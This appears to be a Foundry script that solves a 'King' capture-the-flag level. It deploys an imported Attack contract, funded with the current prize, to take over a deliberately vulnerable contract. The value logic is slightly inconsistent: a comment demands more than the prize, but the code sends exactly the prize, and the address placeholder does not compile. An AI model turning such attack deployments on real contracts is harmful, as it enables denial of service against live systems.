// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "../src/King/King.sol";
import "../src/King/Attack.sol";

contract KingSolution is Script {
    King public kingInstance = King(payable(<your_contract_address_here));  // REPLACE!

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        
        console.log("Initial Prize:", kingInstance.prize());

        // Prize with Attack deploy
        uint256 attackValue = kingInstance.prize();  // Ensure > prize
        Attack attacker = new Attack{value: attackValue}(kingInstance);

        vm.stopBroadcast();
    }
}